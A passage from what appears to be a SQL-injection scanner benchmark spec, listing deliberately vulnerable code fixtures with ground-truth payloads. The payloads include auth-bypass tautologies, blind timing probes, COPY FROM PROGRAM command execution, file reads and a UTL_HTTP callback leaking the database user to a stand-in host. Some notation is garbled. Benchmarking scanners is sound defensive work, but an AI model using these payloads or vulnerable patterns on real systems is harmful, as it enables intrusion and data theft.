- **Why Legacy Scanners Fail:** Scanners fail to close the string concatenation and `JSON_VALUE` function signature simultaneously.

---

### 16.5 Category 5: ORM-Specific Leaks & Query Interpolation Flaws

#### Fixture HP-21: Django ORM extra() Clause SQL Injection
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** Python 3.12 / Django 5.0
- **Injection Context:** `extra(select={...})` dictionary parameter
- **Vulnerable Source Code:**
  ```python
  # views.py
  order_param = request.GET.get('order_field')
  users = User.objects.extra(select={'custom_sort': f"user_profile.{order_param}"}).order_by('custom_sort')
  ```
- **Ground-Truth Trigger Vector:** `id, (SELECT CASE WHEN (1=1) THEN 1 ELSE (1/0) END)`
- **Forensic Evidence Artifact:** Division-by-zero database error triggered under boolean condition.
- **Why Legacy Scanners Fail:** The ORM wraps the query in Django's model abstraction; parameters appear as harmless column names.

#### Fixture HP-22: Hibernate HQL Positional String Interpolation
- **Target DBMS:** MySQL 8.4 LTS
- **Application Architecture:** Java 21 / Spring Boot 3.3 with Hibernate 6
- **Injection Context:** HQL query string formatted with `String.format()`
- **Vulnerable Source Code:**
  ```java
  String hql = String.format("FROM Account WHERE owner = '%s' AND status = 'ACTIVE'", userInput);
  Query query = session.createQuery(hql, Account.class);
  ```
- **Ground-Truth Trigger Vector:** `admin' OR 1=1 AND ''='`
- **Forensic Evidence Artifact:** All accounts returned; HQL AST accepts standard SQL boolean tautology.
- **Why Legacy Scanners Fail:** Scanners attempting MySQL-specific comments (`#`, `-- -`) fail in HQL parser because HQL does not support MySQL comment syntax.

#### Fixture HP-23: Sequelize raw Replacement in order Array
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** Node.js / Express with Sequelize 6.37
- **Injection Context:** `Sequelize.literal()` inside `order` array
- **Vulnerable Source Code:**
  ```javascript
  const order = req.query.sort;
  const items = await Item.findAll({ order: [Sequelize.literal(`${order} ASC`)] });
  ```
- **Ground-Truth Trigger Vector:** `(CASE WHEN (SELECT 1=1) THEN id ELSE price END)`
- **Forensic Evidence Artifact:** Deterministic row reordering based on boolean assertion.
- **Why Legacy Scanners Fail:** Sequelize silently discards queries with unhandled syntax errors without returning 500 status codes.

#### Fixture HP-24: Ruby on Rails ActiveRecord where String Interpolation
- **Target DBMS:** SQLite 3.45.3
- **Application Architecture:** Ruby 3.3 / Rails 7.1
- **Injection Context:** `where("name = '#{params[:name]}'")` unescaped string
- **Vulnerable Source Code:**
  ```ruby
  @users = User.where("status = 'active' AND name = '#{params[:name]}'")
  ```
- **Ground-Truth Trigger Vector:** `John' OR 1=1--`
- **Forensic Evidence Artifact:** All user records returned in HTML view.
- **Why Legacy Scanners Fail:** Rails CSRF tokens and session cookies rotate on each request, breaking stateless scanners.

#### Fixture HP-25: SQLAlchemy text() Dynamic Column Clause
- **Target DBMS:** Microsoft SQL Server 2022
- **Application Architecture:** Python / FastAPI with SQLAlchemy 2.0
- **Injection Context:** `select().where(text(f"col = {user_input}"))`
- **Vulnerable Source Code:**
  ```python
  stmt = select(Customer).where(text(f"tenant_id = 1 AND age > {user_input}"))
  result = session.execute(stmt).scalars().all()
  ```
- **Ground-Truth Trigger Vector:** `0 OR (SELECT 1)=1`
- **Forensic Evidence Artifact:** Full customer list returned bypassing tenant partition logic.
- **Why Legacy Scanners Fail:** Integer scalar injection inside SQLAlchemy `text()` clause without single quotes.

---

### 16.6 Category 6: Polyglot & Multi-Encoding Injections

#### Fixture HP-26: Unicode Fullwidth Quote Normalization Bypass
- **Target DBMS:** MySQL 8.4 LTS
- **Application Architecture:** Java / Spring Boot with Apache Commons Text normalization
- **Injection Context:** Unicode Fullwidth Single Quote (`＇` / `?`) normalized to ASCII `'` after WAF inspection
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM products WHERE sku = '[NORMALIZED_INPUT]';
  ```
- **Ground-Truth Trigger Vector:** `＇ OR 1=1-- -`
- **Forensic Evidence Artifact:** WAF allows payload because regex for `'` does not match fullwidth `＇`; backend normalizer converts it to `'`, triggering tautology.
- **Why Legacy Scanners Fail:** Scanners send standard ASCII quotes which are blocked by WAF with HTTP 403; scanners do not test fullwidth Unicode transforms.

#### Fixture HP-27: Double URL Encoding with Reverse Proxy Passthrough
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** NGINX reverse proxy (decodes 1x) -> Node.js backend (decodes 2nd time) -> Raw SQL
- **Injection Context:** Double URL encoded string parameter (`%2527`)
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM articles WHERE slug = '[DECODED_INPUT]';
  ```
- **Ground-Truth Trigger Vector:** `%2527%20OR%201%3D1--`
- **Forensic Evidence Artifact:** NGINX decodes to `%27 OR 1=1--` (safe in regex); Node.js decodes to `' OR 1=1--` (executes in SQL).
- **Why Legacy Scanners Fail:** Scanners fail to detect multi-tiered decoding chains and conclude parameter is immune to SQL injection.

#### Fixture HP-28: Base64-Wrapped Payload in JSON API Body
- **Target DBMS:** SQLite 3.45.3
- **Application Architecture:** Go / Fiber API accepting base64-encoded encrypted token payload
- **Injection Context:** Base64-decoded JSON field interpolated into SQLite query:
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM session_vault WHERE session_token = '[DECODED_TOKEN]';
  ```
- **Ground-Truth Trigger Vector:** `Base64Encode("admin' OR '1'='1")` -> `YWRtaW4nIE9SICcxJz0nMQ==`
- **Forensic Evidence Artifact:** Bypasses authentication check and returns admin session data.
- **Why Legacy Scanners Fail:** Black-box scanners fuzz the top-level string without applying Base64 container encoding.

#### Fixture HP-29: Nested XML Entity Expansion SQL Injection
- **Target DBMS:** Oracle 23c Free
- **Application Architecture:** SOAP / XML Web Service in Java
- **Injection Context:** XML payload with internal entity definition expanding into SQL payload:
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM transactions WHERE tx_id = '[EXPANDED_ENTITY]';
  ```
- **Ground-Truth Trigger Vector:** `<!DOCTYPE foo [<!ENTITY x "1' OR '1'='1">]><id>&x;</id>`
- **Forensic Evidence Artifact:** Entity parser expands payload before SQL query concatenation.
- **Why Legacy Scanners Fail:** Standard DAST scanners do not parse XML schemas or test entity expansion channels.

#### Fixture HP-30: UTF-8 Overlong Byte Encoding
- **Target DBMS:** MySQL 8.4 LTS
- **Application Architecture:** PHP 8.3 with custom unescaping library
- **Injection Context:** Overlong 2-byte UTF-8 sequence for single quote (`À§`)
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM members WHERE code = '[INPUT]';
  ```
- **Ground-Truth Trigger Vector:** `À§ OR 1=1-- -`
- **Forensic Evidence Artifact:** WAF treats `À§` as non-quote binary character; custom unescaping decodes it to ASCII `'`.
- **Why Legacy Scanners Fail:** Standard scanners only emit valid UTF-8, missing parser differential vulnerabilities.

---

### 16.7 Category 7: Time-Based Blind Under Extreme Network Jitter & Non-Stationary Drift

#### Fixture HP-31: Micro-Delay Under Pareto Heavy-Tailed Network Jitter
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** Rust / Axum (Network Jitter: Pareto shape $lpha=1.45$, mean variance $\sigma = 240	ext{ms}$)
- **Injection Context:** Numeric ID parameter with $300	ext{ms}$ conditional sleep:
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM sensor_readings WHERE device_id = [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `101 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(0.3) ELSE pg_sleep(0) END)`
- **Forensic Evidence Artifact:** Sequential Probability Ratio Test (SPRT) rejects $H_0$ within $N=14$ requests ($\Lambda_N > A$), whereas standard $t$-test fails due to infinite Pareto variance.
- **Why Legacy Scanners Fail:** Fixed 5-second sleep payloads trip edge 504 Gateway Timeouts; sub-second sleeps are lost in the $240	ext{ms}$ network variance floor.

#### Fixture HP-32: MySQL Heavy Benchmark Time-Delay Under Server Load
- **Target DBMS:** MySQL 8.4 LTS
- **Application Architecture:** Python / Django on high-concurrency CPU load
- **Injection Context:** Time delay via `BENCHMARK(5000000, MD5('test'))`
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM orders WHERE status = 'pending' AND user_id = [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `42 AND (SELECT IF(1=1, BENCHMARK(4000000, SHA1('a')), 0))`
- **Forensic Evidence Artifact:** Statistical Welch $t$-test confirms asymmetric execution delay ($p < 10^{-5}$).
- **Why Legacy Scanners Fail:** CPU contention causes benchmark latency to fluctuate widely; scanners without CUSUM drift tracking report false negative.

#### Fixture HP-33: Asymmetric Lock Contention Micro-Delay
- **Target DBMS:** Microsoft SQL Server 2022
- **Application Architecture:** C# / .NET Core 8 Web API
- **Injection Context:** Time delay via conditional `WAITFOR DELAY '0:0:0.400'`
- **Vulnerable SQL Template:**
  ```sql
  SELECT item_name FROM inventory WHERE warehouse_code = '[INJECTION]';
  ```
- **Ground-Truth Trigger Vector:** `WH-1'; IF (SELECT 1)=1 WAITFOR DELAY '0:0:0.400'--`
- **Forensic Evidence Artifact:** Interleaved $A/B/A/B$ probe schedule confirms $400	ext{ms}$ delta across 8 samples.
- **Why Legacy Scanners Fail:** Legacy scanners require 5000ms delay to register a hit; short delays are ignored.

#### Fixture HP-34: SQLite Recursive CTE Computational Delay
- **Target DBMS:** SQLite 3.45.3
- **Application Architecture:** Go / Gin (SQLite WAL mode)
- **Injection Context:** CPU-intensive recursive quadratic subquery as artificial sleep:
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM logs WHERE level = '[INJECTION]';
  ```
- **Ground-Truth Trigger Vector:** `INFO' AND (WITH RECURSIVE r(i) AS (VALUES(1) UNION ALL SELECT i+1 FROM r WHERE i<1500000) SELECT COUNT(*) FROM r)>0--`
- **Forensic Evidence Artifact:** CPU computation generates reproducible $450	ext{ms}$ delay in typeless SQLite.
- **Why Legacy Scanners Fail:** SQLite lacks a native `SLEEP()` function; legacy scanners fail to synthesize recursive CTE computational delays.

#### Fixture HP-35: Oracle Asymmetric UTL_INADDR DNS Timeout Delay
- **Target DBMS:** Oracle 23c Free
- **Application Architecture:** Java 21 / Spring Boot
- **Injection Context:** Timeout delay via unreachable internal DNS host lookup:
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM accounts WHERE acc_num = '[INJECTION]';
  ```
- **Ground-Truth Trigger Vector:** `ACC100' AND UTL_INADDR.GET_HOST_ADDRESS('10.255.255.1') IS NOT NULL--`
- **Forensic Evidence Artifact:** Network connect timeout introduces deterministic 2000ms delay on vulnerable branch.
- **Why Legacy Scanners Fail:** Outbound egress filtering blocks external DNS, but internal RFC 1918 timeout still delays thread execution.

---

### 16.8 Category 8: Blind Boolean With Minimal 1-Bit Delta

#### Fixture HP-36: Single Whitespace HTML Delta
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** Node.js / EJS Template Engine
- **Injection Context:** Boolean condition controlling a single trailing space in an HTML attribute:
- **Vulnerable SQL Template:**
  ```sql
  SELECT is_verified FROM user_flags WHERE user_id = [INJECTION];
  ```
- **Application Template:** `<div class="badge<%= user.is_verified ? " " : "" %>">Verified</div>`
- **Ground-Truth Trigger Vector:** `101 AND 1=1` vs `101 AND 1=2`
- **Forensic Evidence Artifact:** Response size delta is exactly 1 byte (`0x20` whitespace character).
- **Why Legacy Scanners Fail:** DOM parsers and HTML diffing engines normalize whitespace, discarding the 1-byte delta and reporting endpoint as Non-Vulnerable.

#### Fixture HP-37: 1-Pixel CSS Status Class Toggle
- **Target DBMS:** MySQL 8.4 LTS
- **Application Architecture:** Python / Django with Tailwind CSS
- **Injection Context:** Boolean query result rendered as `text-green-500` vs `text-red-500`:
- **Vulnerable SQL Template:**
  ```sql
  SELECT status_ok FROM server_nodes WHERE node_id = [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `1 AND 1=1` vs `1 AND 1=2`
- **Forensic Evidence Artifact:** Exact DOM attribute delta in `<span class="...">`.
- **Why Legacy Scanners Fail:** Response string lengths are identical ($|R_{\text{true}}| = |R_{\text{false}}|$); legacy scanners diffing string length miss the vulnerability.

#### Fixture HP-38: Shopping Cart Item Count Badge Delta (3 vs 4)
- **Target DBMS:** SQLite 3.45.3
- **Application Architecture:** React SPA with JSON REST Backend
- **Injection Context:** Boolean query controlling `cart_count` integer in JSON response:
- **Vulnerable SQL Template:**
  ```sql
  SELECT COUNT(*) FROM cart_items WHERE session_id = 'sess_1' AND [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `1=1` vs `1=2`
- **Forensic Evidence Artifact:** JSON payload delta: `{"cart_count": 4}` vs `{"cart_count": 3}`.
- **Why Legacy Scanners Fail:** Overall JSON response length is identical (1 byte digit change); naive similarity metrics score 99.8% similarity and discard as random noise.

#### Fixture HP-39: Pagination First-Item ID Sorting Shift
- **Target DBMS:** Microsoft SQL Server 2022
- **Application Architecture:** ASP.NET Core 8 Web API
- **Injection Context:** Boolean condition shifting top item ID from 1042 to 1043:
- **Vulnerable SQL Template:**
  ```sql
  SELECT TOP 10 id, name FROM products ORDER BY CASE WHEN [INJECTION] THEN id ELSE price END ASC;
  ```
- **Ground-Truth Trigger Vector:** `(SELECT 1)=1` vs `(SELECT 1)=2`
- **Forensic Evidence Artifact:** List of 10 items shifts order; array permutation detected via Jaccard distance.
- **Why Legacy Scanners Fail:** Same total response length and same set of items returned; scanners miss the ordering delta without JSON AST array diffing.

#### Fixture HP-40: HTTP ETag Header Hash Delta
- **Target DBMS:** MariaDB 11.4 LTS
- **Application Architecture:** Go / Axum with conditional ETag caching
- **Injection Context:** Boolean condition altering the database row `updated_at` timestamp reflected in HTTP `ETag`:
- **Vulnerable SQL Template:**
  ```sql
  SELECT MAX(updated_at) FROM articles WHERE category = '[INJECTION]';
  ```
- **Ground-Truth Trigger Vector:** `tech' AND 1=1-- -` vs `tech' AND 1=2-- -`
- **Forensic Evidence Artifact:** Response body is empty (HTTP 304 / 200), but `ETag: W/"..."` header hash differs deterministically.
- **Why Legacy Scanners Fail:** Scanners only inspect response body text, ignoring HTTP header state changes.

---

### 16.9 Category 9: Stored Procedure & Dynamic SQL Execution

#### Fixture HP-41: MSSQL sp_executesql Dynamic Parameter Concatenation
- **Target DBMS:** Microsoft SQL Server 2022
- **Application Architecture:** C# / .NET 8 Web API calling stored procedure
- **Injection Context:** Stored procedure internally executing dynamic SQL via `sp_executesql`:
- **Vulnerable SQL Template:**
  ```sql
  CREATE PROCEDURE SearchUsers @SearchTerm NVARCHAR(100) AS BEGIN
      DECLARE @sql NVARCHAR(MAX) = N'SELECT id, username FROM users WHERE username LIKE ''' + @SearchTerm + N'%''';
      EXEC sp_executesql @sql;
  END;
  ```
- **Ground-Truth Trigger Vector:** `admin%' UNION SELECT 1, @@version--`
- **Forensic Evidence Artifact:** Version string returned in result set.
- **Why Legacy Scanners Fail:** Stored procedure invocation masks the dynamic concatenation; requires understanding nested escaping.

#### Fixture HP-42: PostgreSQL PL/pgSQL EXECUTE format() Vulnerability
- **Target DBMS:** PostgreSQL 16.3
- **Application Architecture:** Python / FastAPI calling PL/pgSQL function
- **Injection Context:** Dynamic table partition query using unquoted `%s` in `format()`:
- **Vulnerable SQL Template:**
  ```sql
  CREATE OR REPLACE FUNCTION get_partition(part_date text) RETURNS SETOF logs AS $$ BEGIN
      RETURN QUERY EXECUTE format('SELECT * FROM logs_%s WHERE level = ''ERROR''', part_date);
  END; $$ LANGUAGE plpgsql;
  ```
- **Ground-Truth Trigger Vector:** `2026_08 WHERE 1=1 UNION SELECT 1, version(), now()--`
- **Forensic Evidence Artifact:** Database version banner reflected in log viewer.
- **Why Legacy Scanners Fail:** Injection occurs in table name position inside dynamic PL/pgSQL string; standard column injection payloads fail.

#### Fixture HP-43: Oracle PL/SQL EXECUTE IMMEDIATE with String Concatenation
- **Target DBMS:** Oracle 23c Free
- **Application Architecture:** Java 21 / Spring Boot calling Oracle Package
- **Injection Context:** Anonymous PL/SQL block with `EXECUTE IMMEDIATE`:
- **Vulnerable SQL Template:**
  ```sql
  DECLARE v_sql VARCHAR2(1000); v_res VARCHAR2(100); BEGIN
      v_sql := 'SELECT email FROM accounts WHERE id = ' || [INJECTION];
      EXECUTE IMMEDIATE v_sql INTO v_res;
  END;
  ```
- **Ground-Truth Trigger Vector:** `1 UNION SELECT USER FROM DUAL`
- **Forensic Evidence Artifact:** Current database user returned in output parameter.
- **Why Legacy Scanners Fail:** Single-quote payloads fail because injection is in numeric scalar position inside PL/SQL block.

#### Fixture HP-44: MySQL Dynamic Prepared Statement in Stored Procedure
- **Target DBMS:** MySQL 8.4 LTS
- **Application Architecture:** PHP 8.3 / Laravel calling stored procedure
- **Injection Context:** Dynamic `PREPARE stmt FROM @query`:
- **Vulnerable SQL Template:**
  ```sql
  CREATE PROCEDURE FilterProducts(IN sort_col VARCHAR(50)) BEGIN
      SET @q = CONCAT('SELECT * FROM products ORDER BY ', sort_col);
      PREPARE stmt FROM @q; EXECUTE stmt; DEALLOCATE PREPARE stmt;
  END;
  ```
- **Ground-Truth Trigger Vector:** `(CASE WHEN (1=1) THEN id ELSE price END) ASC`
- **Forensic Evidence Artifact:** Sorting order modulation in JSON array.
- **Why Legacy Scanners Fail:** Stored procedure suppresses detailed SQL syntax errors on malformed queries.

#### Fixture HP-45: SQLite Dynamic Query in Custom C-Extension UDF
- **Target DBMS:** SQLite 3.45.3
- **Application Architecture:** C++ / Python embedding custom SQLite user-defined function (UDF)
- **Injection Context:** UDF executing secondary dynamic query from argument string:
- **Vulnerable SQL Template:**
  ```sql
  SELECT eval_expression('[INJECTION]') FROM dual_table;
  ```
- **Ground-Truth Trigger Vector:** `SELECT sql FROM sqlite_master`
- **Forensic Evidence Artifact:** Database schema returned from custom evaluation sink.
- **Why Legacy Scanners Fail:** UDF executes non-standard SQL execution context.

---

### 16.10 Category 10: Non-Standard DBMS Features & Vendor Dialects

#### Fixture HP-46: SQLite ATTACH DATABASE File Extraction
- **Target DBMS:** SQLite 3.45.3
- **Application Architecture:** Python / Flask with multi-query enabled
- **Injection Context:** Multi-statement injection executing `ATTACH DATABASE`:
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM notes WHERE id = [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `1; ATTACH DATABASE '/tmp/pwned.db' AS pwn; CREATE TABLE pwn.dump AS SELECT * FROM users;--`
- **Forensic Evidence Artifact:** Secondary SQLite file `/tmp/pwned.db` created on disk with dumped tables.
- **Why Legacy Scanners Fail:** Scanners do not test multi-statement database attachment semantics.

#### Fixture HP-47: PostgreSQL COPY FROM PROGRAM Command Execution
- **Target DBMS:** PostgreSQL 16.3 (Superuser / RDS Role)
- **Application Architecture:** Node.js / Express with multi-statement enabled
- **Injection Context:** `COPY ... FROM PROGRAM` command injection
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM reports WHERE report_id = [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `1; CREATE TEMP TABLE cmd_out(res text); COPY cmd_out FROM PROGRAM 'id';--`
- **Forensic Evidence Artifact:** Injected command output reflected in subsequent temporary table query.
- **Why Legacy Scanners Fail:** Scanners assume standard `UNION SELECT` extraction and miss database file I/O primitives.

#### Fixture HP-48: MySQL HANDLER Table Direct Access Injection
- **Target DBMS:** MySQL 8.4 LTS
- **Application Architecture:** Python / FastAPI with `mysqlclient`
- **Injection Context:** Multi-statement `HANDLER` operator bypassing SQL optimizer:
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM public_posts WHERE id = [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `1; HANDLER secret_keys OPEN; HANDLER secret_keys READ FIRST;-- -`
- **Forensic Evidence Artifact:** Direct storage engine table read bypassing standard `SELECT` permission triggers.
- **Why Legacy Scanners Fail:** Scanners do not include MySQL `HANDLER` syntax in their mutation grammars.

#### Fixture HP-49: Microsoft SQL Server OPENROWSET Bulk Injection
- **Target DBMS:** Microsoft SQL Server 2022
- **Application Architecture:** C# / .NET 8 Web API
- **Injection Context:** Multi-statement `OPENROWSET(BULK ...)` file reading
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM documents WHERE doc_id = [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `1 UNION SELECT 1, BulkColumn, 3 FROM OPENROWSET(BULK 'C:\Windows\win.ini', SINGLE_CLOB) as x--`
- **Forensic Evidence Artifact:** File content reflected in document text field.
- **Why Legacy Scanners Fail:** Requires Windows-specific bulk rowset syntax.

#### Fixture HP-50: Oracle Database UTL_HTTP OAST Out-of-Band Callback
- **Target DBMS:** Oracle 23c Free
- **Application Architecture:** Java 21 / Spring Boot with Oracle JDBC
- **Injection Context:** Dynamic query triggering out-of-band HTTP request via `UTL_HTTP`:
- **Vulnerable SQL Template:**
  ```sql
  SELECT * FROM employees WHERE emp_id = [INJECTION];
  ```
- **Ground-Truth Trigger Vector:** `100 AND (SELECT UTL_HTTP.REQUEST('http://' || (SELECT user FROM DUAL) || '.oast.sentinel.internal/cb') FROM DUAL) IS NOT NULL--`
- **Forensic Evidence Artifact:** Cryptographic OAST DNS/HTTP callback received with database user token.
- **Why Legacy Scanners Fail:** In-band response is 100% identical; requires OAST listener correlation.

---

## 17. Hard-Negative Corpus (Difficult Negative Controls)

The Hard-Negative Corpus consists of **50+ deceptive, 100% non-vulnerable control fixtures** across 10 specialized categories, specifically engineered to induce **False Positives** in legacy scanners. Any engine that emits a positive finding on these endpoints fails the precision benchmark.

```
+---------------------------------------------------------------------------------------------------------------+
|                                HARD-NEGATIVE CORPUS CATEGORY DISTRIBUTION                                     |
+--------------------------------------------------------------------+------------------------------------------+
| Category                                                           | Control ID Range & Scope                 |
+--------------------------------------------------------------------+------------------------------------------+
| Cat 1: Reflected Input in SQL Error Lookalike Strings              | HN-01 to HN-05 (Client validation, templates)
| Cat 2: Mathematical & Arithmetic Parameters in Safe Domain Logic   | HN-06 to HN-10 (Math calculators, pagers)|
| Cat 3: Search Engines Echoing Arbitrary SQL Keywords               | HN-11 to HN-15 (Search echo, highlight)  |
| Cat 4: Randomly Fluctuating Page Contents & Dynamic Noise          | HN-16 to HN-20 (Rotating ads, nonces)    |
| Cat 5: Stateful Rate Limiters / WAF Tarpits Mimicking Delays       | HN-21 to HN-25 (Progressive 429 delays)  |
| Cat 6: Integer Type-Casting Returning 0 on Non-Numeric Strings     | HN-26 to HN-30 (intval, parseInt, casts) |
| Cat 7: WAF Blocking Pages Returning HTTP 500 / "Database Error"    | HN-31 to HN-35 (ModSecurity 500 pages)   |
| Cat 8: Safe Parameterized Queries with Non-SQL Formatting          | HN-36 to HN-40 (GraphQL, Elasticsearch)  |
| Cat 9: Safe ORM / Query Builder Parameters with Reserved Keywords  | HN-41 to HN-45 (Static enum sort/filter) |
| Cat 10: Multi-Tenant Boundary Checks & Generic Auth Rejections     | HN-46 to HN-50+ (Tenant 403 masking)     |
+--------------------------------------------------------------------+------------------------------------------+
```

---

### 17.1 Category 1: Reflected Input in SQL Error Lookalike Strings

#### Fixture HN-01: Client-Side Form Validator Error Echo
- **Target Endpoint:** `POST /api/validate-username`
- **Safe Implementation:** Parameter is validated using a regex pattern. If invalid characters are present, the application returns a generic JSON message echoing the input:
  ```json
  {"status": "error", "message": "Syntax error in input near 'test'''"}
  ```
  The database query is executed using parameterized prepared statements (`SELECT id FROM users WHERE username = ?`).
- **Deceptive Mechanism:** String contains the exact substring `"Syntax error ... near '"` which matches legacy error-based regex signatures.
- **Why Legacy Scanners False-Positive:** Scanners search for `"syntax error"` regex without verifying if the error originated from the database driver or client template.
- **Correct Engine Behavior:** Syntax Differential Oracle executes semantic metamorphic queries and confirms zero causal impact on database state ($P(\text{Vuln}) = 0.0$).

#### Fixture HN-02: Template Engine Syntax Error Reflection
- **Target Endpoint:** `GET /search?q=test'`
- **Safe Implementation:** Jinja2 template rendering echoes query into `<div class="error">Template syntax error: unexpected quote near 'test''</div>`. Backend SQL is 100% parameterized via SQLAlchemy.
- **Deceptive Mechanism:** Echoed template error string mimics SQLite/MySQL syntax error banners.
- **Why Legacy Scanners False-Positive:** Regex signature triggers on `"unexpected quote"`.
- **Correct Engine Behavior:** Engine parses DOM AST, recognizes error is inside a frontend template block, and refutes SQL injection hypothesis.

#### Fixture HN-03: Documentation Search Engine with SQL Error Index
- **Target Endpoint:** `GET /docs/search?term=ORA-00933`
- **Safe Implementation:** Technical documentation engine searching Oracle error codes using parameterized Elasticsearch queries. Searching for `ORA-00933` returns documentation page: `"ORA-00933: SQL command not properly ended"`.
- **Deceptive Mechanism:** Exact Oracle ORA error string reflected in HTTP 200 response body.
- **Why Legacy Scanners False-Positive:** Error-based scanner matches `ORA-00933` signature and flags high-severity SQLi.
- **Correct Engine Behavior:** Causal DAG confirms that injecting valid Oracle syntax does not alter database execution logic.

#### Fixture HN-04: Static Mock API Returning Fake Database Error
- **Target Endpoint:** `POST /dev/mock-db-error`
- **Safe Implementation:** Microservice mock endpoint used for frontend error UI testing. Always returns HTTP 500 with body `{"error": "PostgreSQL: relation does not exist"}`.
- **Deceptive Mechanism:** Static HTTP 500 with genuine PostgreSQL driver error message.
- **Why Legacy Scanners False-Positive:** Invariant error reflection fools legacy differential tests.
- **Correct Engine Behavior:** NoREC and Boolean oracles observe zero state differential across all probe pairs; engine refutes finding.

#### Fixture HN-05: Customer Support Chatbot Echoing SQL Phrases
- **Target Endpoint:** `POST /api/chat/message`
- **Safe Implementation:** LLM chatbot echoing user query in context: `"You asked about: ' UNION SELECT ... - let me help with SQL tutorials."`
- **Deceptive Mechanism:** Echoes raw SQL syntax verbatim in structured JSON.
- **Why Legacy Scanners False-Positive:** Scanners detect SQL keywords in response and infer injection success.
- **Correct Engine Behavior:** Structural Causal Model verifies input is merely data payload in chatbot state.

---

### 17.2 Category 2: Mathematical & Arithmetic Parameters in Safe Domain Logic

#### Fixture HN-06: Safe Math Expression Evaluation in Pagination Controller
- **Target Endpoint:** `GET /products?page=2-1`
- **Safe Implementation:** Node.js application parses `page` parameter with `mathjs.evaluate(req.query.page)`. Result `1` is passed to parameterized query `SELECT * FROM products LIMIT 10 OFFSET 0`.
- **Deceptive Mechanism:** `page=1+0` returns Page 1; `page=2*1` returns Page 2; `page=3-1` returns Page 2.
- **Why Legacy Scanners False-Positive:** Arithmetic differential oracles (e.g. sqlmap `--eval` or numeric differential testing) observe that `1+0` matches `1` while `1+1` matches `2`, falsely concluding that the database is evaluating the arithmetic in a numeric SQL context.
- **Correct Engine Behavior:** Metamorphic Tautology Oracle injects SQL-specific non-math constructs (e.g., `1+(SELECT 0)`) which fail in application math parser, refuting SQL injection.

#### Fixture HN-07: Discount Code Percentage Calculator
- **Target Endpoint:** `GET /cart/discount?code=10*2`
- **Safe Implementation:** Custom pricing rule engine evaluates simple arithmetic for percentage discounts. Database lookup is fully parameterized (`SELECT discount FROM coupons WHERE code = ?`).
- **Deceptive Mechanism:** Parameter evaluates arithmetic dynamically in Python layer before database lookup.
- **Why Legacy Scanners False-Positive:** Scanners attribute arithmetic evaluation to backend SQL engine.
- **Correct Engine Behavior:** Causal DAG verifies database query structure is static.

#### Fixture HN-08: Geolocation Bounding Box Safe Expression Parser
- **Target Endpoint:** `GET /map/nodes?lat=45.5+0.1&lng=-122.6-0.2`
- **Safe Implementation:** Application uses `parseFloat()` and safe arithmetic to compute bounding box coordinates.
- **Deceptive Mechanism:** Arithmetic input modulates map query radius.
- **Why Legacy Scanners False-Positive:** Numeric injection checks falsely trigger on response coordinate shifts.
- **Correct Engine Behavior:** SMT constraint solver proves that SQL AST boundaries are closed and unreachable.

#### Fixture HN-09: Financial Currency Conversion Ratio Parameter
- **Target Endpoint:** `GET /convert?from=USD&to=EUR&multiplier=1.0*1.0`
- **Safe Implementation:** Microservice arithmetic calculator.
- **Deceptive Mechanism:** Response amounts scale with mathematical injection.
- **Why Legacy Scanners False-Positive:** Observed numeric multiplication delta attributed to SQL.
- **Correct Engine Behavior:** Syntax probes (`multiplier=1.0*(SELECT 1)`) fail to execute, confirming non-SQL evaluation.

#### Fixture HN-10: Dashboard Time Range Safe Subtraction (`?hours=24-12`)
- **Target Endpoint:** `GET /metrics?range_hours=24-12`
- **Safe Implementation:** Safe integer subtraction in Go backend before parameterized timestamp query.
- **Deceptive Mechanism:** `24-12` returns 12 hours of data; `24-0` returns 24 hours of data.
- **Why Legacy Scanners False-Positive:** Response size changes proportionally to arithmetic result.
- **Correct Engine Behavior:** Multi-oracle consensus confirms lack of SQL grammar execution.

---

### 17.3 Category 3: Search Engines Echoing Arbitrary SQL Keywords

#### Fixture HN-11: Full-Text Blog Search Highlighting SQL Keywords
- **Target Endpoint:** `GET /blog/search?q=%27+OR+1%3D1--`
- **Safe Implementation:** PostgreSQL Full-Text Search (`ts_query`) using parameterized bind parameters (`to_tsquery('english', $1)`). Search results highlight query tokens with `<b>' OR 1=1--</b>`.
- **Deceptive Mechanism:** Complete SQL payload echoed in HTML body; response size varies based on search token match count.
- **Why Legacy Scanners False-Positive:** Scanners detect full payload reflection and response length variance, classifying as boolean injection.
- **Correct Engine Behavior:** AST Subtree Locality Filter isolates highlighted search text from relational data tables.

#### Fixture HN-12: Code Repository Search with Keyword Indexing
- **Target Endpoint:** `GET /code/search?query=SELECT+*+FROM+users`
- **Safe Implementation:** Elasticsearch code search repository. Backend database queries are completely parameterized.
- **Deceptive Mechanism:** Echoes `SELECT * FROM users` with syntax highlighting classes.
- **Why Legacy Scanners False-Positive:** Keyword tokenizer flags raw SQL execution.
- **Correct Engine Behavior:** Verification Engine proves no database schema extraction occurs.

#### Fixture HN-13: Security Vulnerability Database Search
- **Target Endpoint:** `GET /cve/search?filter=sql+injection`
- **Safe Implementation:** Parameterized search returning CVE records describing SQL injection flaws.
- **Deceptive Mechanism:** Response body contains dozens of SQL injection exploit strings.
